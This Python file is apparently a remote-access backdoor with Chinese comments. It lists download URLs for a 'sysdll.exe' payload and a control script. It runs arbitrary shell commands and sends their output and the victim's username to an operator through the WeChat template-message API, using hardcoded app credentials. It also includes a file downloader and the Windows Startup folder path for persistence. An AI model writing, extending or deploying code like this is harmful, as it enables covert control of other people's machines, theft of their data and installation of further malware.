"""
代码有变化就执行20300
https://yc.052024.xyz/xz/sysdll.exe
https://yc.052024.xyz/Control_files/Change_Execution.py
"""
import os
import json
import platform
import subprocess
import requests



class WeChat_push:
    """
    微信测试号推送被控信息
    """
    def __init__(self):
        # 从测试号信息获取
        self.appID = ""
        self.appSecret = ""

        # 收信人ID即 用户列表中的微信号，
        self.openId = ""


        # 发送信息模板
        self.Vehicle_Submission_id = "V8uPyRsGUGYCzUnsyPlpuYWAjNUg0OjSD3ALmvTlrhE"
    def get_access_token(self):
        # 获取access token的url
        url = 'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={}&secret={}' \
            .format(self.appID.strip(), self.appSecret.strip())
        response = requests.get(url).json()
        # print(response)
        access_token = response.get('access_token')
        return access_token
    def send_Alleged_information(self, access_token, message):      # 发送被控信息
        body = {
            "touser": self.openId,
            "template_id": self.Vehicle_Submission_id.strip(),
            "url": "https://weixin.qq.com",
            "data": {
                "message": {
                    "value": message
                },
            }
        }
        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={}'.format(access_token)
        print(requests.post(url, json.dumps(body)).text)
        ...
    def Alleged_information(self, message):
        # 1.获取access_token
        access_token = self.get_access_token()
        # 3. 发送消息
        self.send_Alleged_information(access_token, message)
    def send_to_the_user(self, access_token, num_openid, message):
        body = {
            "touser": num_openid,
            "template_id": self.Vehicle_Submission_id.strip(),
            "url": "https://weixin.qq.com",
            "data": {
                "message": {
                    "value": message
                },
            }
        }
        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={}'.format(access_token)
        print(requests.post(url, json.dumps(body)).text)
        ...
wechat_push = WeChat_push()
# 初始化配置
wechat_push.appID = 'wxfe87182bd1371294'
wechat_push.appSecret = '7a6e5a3f118f1f3317f57fb065e7c06a'
wechat_push.openId = 'ogur66Me6Rpbfg6vx7RvUKgGO8AY'
system = platform.system()
sys_Version = platform.release()
sys_username = os.getenv('USERNAME')
# =======

def start_cmd(ml):
    wechat_push.Alleged_information(f'{sys_username}命令代码')
    # 要执行的命令，这里以获取系统信息（systeminfo）为例
    command = ml
    # 使用run函数执行命令，通过shell=True在系统的shell中执行，需要注意安全问题
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(result.stdout)
            wechat_push.Alleged_information(f'{result.stdout}')
        else:
            print(f"命令执行失败，错误信息: {result.stderr}")
            wechat_push.Alleged_information(f'{f"命令执行失败，错误信息: {result.stderr}"}')
    except Exception as e:
        print(f"发生错误: {e}")
        wechat_push.Alleged_information(f"发生错误: {e}")
# 定义下载函数
def download_file(_url, _save_path):
    response = requests.get(_url, stream=True)
    with open(_save_path, 'wb') as f:
        for chunk in response.iter_content(chunk_size=8192):
            f.write(chunk)

# 获取Windows启动文件夹路径
def get_startup_folder_path():
    # 获取当前用户的用户名
    username = os.getlogin()
    # 构建启动文件夹路径
    startup_folder_path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    return startup_folder_path
# ===================干活====================
if sys_username == 'Administrator':
    # start_cmd('start cmd')
    ...
wechat_push.Alleged_information(f'{sys_username}执行cod')

